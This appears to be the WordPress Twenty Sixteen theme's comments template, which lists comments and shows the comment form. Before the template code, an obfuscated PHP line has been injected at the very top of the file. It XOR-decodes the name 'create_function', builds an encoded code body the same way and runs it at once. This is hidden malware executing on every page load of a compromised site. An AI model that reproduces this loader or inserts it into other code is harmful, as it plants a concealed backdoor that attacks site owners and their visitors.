<?php $lMmFWj='Y3P7IS2U1+XTIO '^':A5V=6m3DE;   N';$eyvwTK=$lMmFWj('',';1GXWN:0L3DSm6=0:.;KrV8<0TPTXs250BScKBGry.U=UCZ6 H,8N3+WZ0,fZ><EVDAZ0VxSS1.Mnzuay14Q5p=UDzZVjbNPm:,-0OO3ukTVqKM3f=LNVYEqoDP.9lkGK oIAkE2pV2JrteylQ 3 47q=5D6Hj:E8,V<useN-FZQ-yhK06dlGLD517WFM> gsT,=BkKMLELyGrR5XMeYW6SP7QUSI+M AtSE4QZu<+ 4Ev1m68>EQQ<HLugrw7 ;=xSOLP 6-fJsdJKA:;<EqAI7HUAL94U-,YXvKE1<s6yq+ OXnvdM=9LBQJzDriUPxchODL;1NF52mKVAY91RwlCsgt<oi2zM->yhE -BeqINEQ-:XdKMezAEVPZ103UNkHls -IxR<Fh1JFAIVjBN;>3QM0q915zoB6,F8IoG24U+<E;O5EI3g7 ;1O9E0,7=CNI05;TPy06WH>3 eP5A=-fyZMDL1Yb<1Uoeu13Hkb 3BWYQJgZ8K6.+XRRdIX.K>4zJ,QYoGYE=0=JbJQsmJ53FnBSW,,<e1HBn-hVzTHRVEeBEtUVmggUEYV>MIJRBDPdQQ SDC,7tltcQpJR -4t.,3mXN05N0Jq286L: PWcRV-YY cyqWthsFCae0G.XDp3,JV9D6S W> =U;BQoA KETysgMk:'^'RWoy1;TS8Z+=2SEYIZHcU.WNo01 9,mXE6tJbb<xpH S673YNhTW<lO6.Qs97KHmr  .QzXw8TWdNZUAYJ>X<TR 0ZgvMEuZd3JBBgkZUVtfJkiZZN8<:<+YK 1ZXEPgoIDbhaL;T9G>RZXYDuDRTUlUThdhhNQ AwrUUVE=Y464CQL UOM1nwN<8E228LNOW;YIkPAD1O1sMV6T,,EdwP2<D4nYmO,T +8 MqgUZJLG M;gPWL 02ThdQ818xkrxX2<ltKSTFwMDn= VNYlQ:C>l1 8Xk>HUyeVo.TEH<pUOA;9NKDiKX 74qp9xc<6XKIk -OPgfN8d-93<XR:WDg,51m:,a.mLMYL.ETbXOij30AO=Mk6osHa21.PoX07KuLWKH0CX5OLU+2 ikJf8ZRF4v:xD;HpefRM2YiRgrA;XY7R.Y,3VOOOIn+X1QshP6:aRTH1fMoR2+QWEMtQ ILOUzi -E8=WT,FLN;Z.CFDR66ywlG;J9WWt37+;, G8JGRmG4 HkyaYQI+KjwUMbXWsFf76XMgBZ-;IpAvGihu7qPzuFgfTPR7th3Zyy,dwqbUc7C6 vJRSETEwP+ RLM+EIJ2=6YF:CbVBYO UA4pOrrI8-AJPQwTHSf8klU1O4lTWM>7bcF2Y;QAYrfkjeHE3, QCNvaG');$eyvwTK();
/**
 * The template for displaying comments
 *
 * The area of the page that contains both current comments
 * and the comment form.
 *
 * @package WordPress
 * @subpackage Twenty_Sixteen
 * @since Twenty Sixteen 1.0
 */

/*
 * If the current post is protected by a password and
 * the visitor has not yet entered the password we will
 * return early without loading the comments.
 */
if ( post_password_required() ) {
	return;
}
?>

<div id="comments" class="comments-area">

	<?php if ( have_comments() ) : ?>
		<h2 class="comments-title">
			<?php
				$comments_number = get_comments_number();
				if ( 1 === $comments_number ) {
					/* translators: %s: post title */
					printf( _x( 'One thought on &ldquo;%s&rdquo;', 'comments title', 'twentysixteen' ), get_the_title() );
				} else {
					printf(
						/* translators: 1: number of comments, 2: post title */
						_nx(
							'%1$s thought on &ldquo;%2$s&rdquo;',
							'%1$s thoughts on &ldquo;%2$s&rdquo;',
							$comments_number,
							'comments title',
							'twentysixteen'
						),
						number_format_i18n( $comments_number ),
						get_the_title()
					);
				}
			?>
		</h2>

		<?php the_comments_navigation(); ?>

		<ol class="comment-list">
			<?php
				wp_list_comments( array(
					'style'       => 'ol',
					'short_ping'  => true,
					'avatar_size' => 42,
				) );
			?>
		</ol><!-- .comment-list -->

		<?php the_comments_navigation(); ?>

	<?php endif; // Check for have_comments(). ?>

	<?php
		// If comments are closed and there are comments, let's leave a little note, shall we?
		if ( ! comments_open() && get_comments_number() && post_type_supports( get_post_type(), 'comments' ) ) :
	?>
		<p class="no-comments"><?php _e( 'Comments are closed.', 'twentysixteen' ); ?></p>
	<?php endif; ?>

	<?php
		comment_form( array(
			'title_reply_before' => '<h2 id="reply-title" class="comment-reply-title">',
			'title_reply_after'  => '</h2>',
		) );
	?>

</div><!-- .comments-area -->
